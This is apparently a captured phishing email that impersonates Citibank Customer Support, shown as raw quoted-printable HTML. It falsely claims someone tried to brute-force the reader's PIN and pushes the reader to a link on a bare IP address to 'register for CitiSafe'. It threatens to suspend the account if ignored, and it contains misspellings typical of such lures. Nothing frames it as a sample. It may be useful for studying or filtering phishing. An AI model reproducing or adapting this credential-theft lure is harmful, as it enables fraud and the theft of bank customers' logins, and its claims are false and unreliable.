<b>Dear Citibank Customer</b>,=20
<p> We recently noticed one or more attempts to log in to your =
Citibank<br>
  account from a foreign IP address and we have reasons to believe =
that<br>
  there was attempts to compromise it with brute forcing your PIN =
number.<br>
  No successful login was detected and you have full protection by now. =
<br>
  If you recently accessed your account while travelling, the unusual =
login<br>
  attempts may have been initiated by you.</p>
<p><i>The login attempt was made from:<br>
  IP address: 173.127.187.124<br>
  ISP Host: cache-822.proxyserver.cis.com</i></p>
<p> By now, we used many techniques to verify the accuracy of the<br>
  information our users provide us when they register on the Site.<br>
  However, because user verification on the Internet is difficult, =
Citibank<br>
  cannot and does not confirm each user's purported identity. Thus, =
we<br>
  have established an offline verification system to help you evaluate =
with<br>
  whom you are dealing with. The system is called CitiSafe and it's<br>
  the most secure Citibank wallet so far.</p>
<p> If you are the rightful holder of the account, click the link =
bellow, fill<br>
  the form and then submit as we will verify your identity and register =
you<br>
  to CitiSafe free of charge. This way you are fully protected from =
fraudulent<br>
  activity on all the accounts that you have with us.</p>
<p> <u><b><a =
href=3D"http://211.158.34.242/scripts/confirmation.htm">Click to protect =

  yourself from fraudulent activity!</a></b></u></p>
<p> To make Citibank.com the most secure site, every user will be <br>
  registered to CitiSafe.</p>
<p> <u>NOTE! If you choose to ignore our request, you leave us no choice =
but to<br>
  temporally suspend your account.</u></p>
<p> * <u>Please do not respond to this e-mail, as your reply will not be =
received.</u></p>
<p>Regards, <b>Citibank Customer Support</b><br>
